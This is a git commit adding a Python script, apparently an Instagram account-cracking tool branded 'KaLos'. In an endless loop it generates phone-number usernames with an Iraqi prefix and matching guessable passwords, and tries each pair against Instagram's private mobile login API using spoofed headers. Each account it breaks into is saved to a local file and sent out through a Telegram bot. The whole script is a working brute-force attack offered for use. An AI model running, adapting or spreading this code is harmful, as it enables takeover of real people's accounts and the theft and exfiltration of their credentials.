4af2db6dc75a1d3f7944200ceae0ef69a14823a2
8kiu <90859472+8kiu@users.noreply.github.com>
2021-09-23 05:21:03 -0700

    Add files via upload

---
+++ igh.py
@@ -0,0 +1,124 @@
+import os
+try:
+    import uuid
+except:
+    os.system('pip install uuid')
+
+try:
+    from random import *
+except:
+    os.systeam('pip install random ')
+
+try:
+    import string
+except:
+    os.system('pip install string')
+
+try:
+    import requests
+except:
+    os.system('pip install requests ')
+
+try:
+    from user_agent import generate_user_agent
+except:
+    os.system('pip install user_agent ')
+
+try:
+    from datetime import datetime
+except:
+    os.system('pip install datetime ')
+
+try:
+    import time
+except:
+    os.system('pip install time')
+else:
+    os.system('clear')
+    try:
+        import pyfiglet
+    except:
+        os.system('pip install pyfiglet')
+    else:
+        os.system('clear')
+        import pyfiglet, os
+        from time import sleep
+        import webbrowser
+        Z = '\x1b[2;31m'
+        G = '\x1b[1;32m'
+        sleep(1)
+        bnar = pyfiglet.figlet_format('KaLos')
+        print(G + bnar)
+        sleep(1)
+        import random, uuid, requests, string
+        from user_agent import generate_user_agent
+        from datetime import datetime
+        from random import *
+        from time import sleep
+        import requests, os, random, json, threading, secrets, uuid
+        from colorama import Fore, Style
+        from time import sleep
+        from datetime import datetime
+        from secrets import token_hex
+        from uuid import uuid4
+        from user_agent import generate_user_agent
+        from uuid import uuid4
+        aa = 0
+        zz = 0
+        E = '\x1b[1;31m'
+        G = '\x1b[1;32m'
+        S = '\x1b[1;33m'
+        webbrowser.open('')
+        print(E + '[' + S + '!' + E + ']' + G + ' ID𐇭 ')
+        print('\n')
+        ID = input(S + ' ID ')
+        print('\n')
+        sleep(2)
+        token = input('token')
+        w = 'https://pastebin.com/raw/xPfV5eKD'
+        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=@BBIBIEB @BBIBIEB").json()
+        id_msg = start_msg['result']['message_id']
+        rss = requests.get(w).text
+        if 'weaver' in rss:
+            sleep(0.1)
+        r = requests.Session()
+        user = '0987654321'
+        while True:
+            us = str(''.join((random.choice(user) for i in range(7))))
+            username = '+964751' + us
+            password = '0751' + us
+            url = 'https://i.instagram.com/api/v1/accounts/login/'
+            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
+             'Accept':'*/*', 
+             'Cookie':'missing', 
+             'Accept-Encoding':'gzip, deflate', 
+             'Accept-Language':'en-US', 
+             'X-IG-Capabilities':'3brTvw==', 
+             'X-IG-Connection-Type':'WIFI', 
+             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
+             'Host':'i.instagram.com'}
+            uid = str(uuid4())
+            data = {'uuid':uid, 
+             'password':password, 
+             'username':username, 
+             'device_id':uid, 
+             'from_reg':'false', 
+             '_csrftoken':'missing', 
+             'login_attempt_countn':'0'}
+            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
+            if 'logged_in_user' in req_login.text:
+                zz += 1
+                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
+                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&textقدآوي جآبلگ   حساب🇮🇶🦅 .\n\n 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 : {username}\n 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 : {password}\n- Dev : KaLos [] @BBIBIEB "
+                i = requests.post(tlg)
+                with open('insta.txt', 'a') as (HACKED):
+                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
+            elif '"message":"challenge_required","challenge"' in req_login.text:
+                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
+            else:
+                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -@BBIBIEB \n KaLos ✅ [{zz}] \n------------------------------------------\n روح دخن ❌[{aa}]  ( {username} ) \n Dev →  KaLos | @BBIBIEB 🔥")
+                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
+                aa += 1
+
+        print('@uii_a')
+        print('@BBIBIEB')
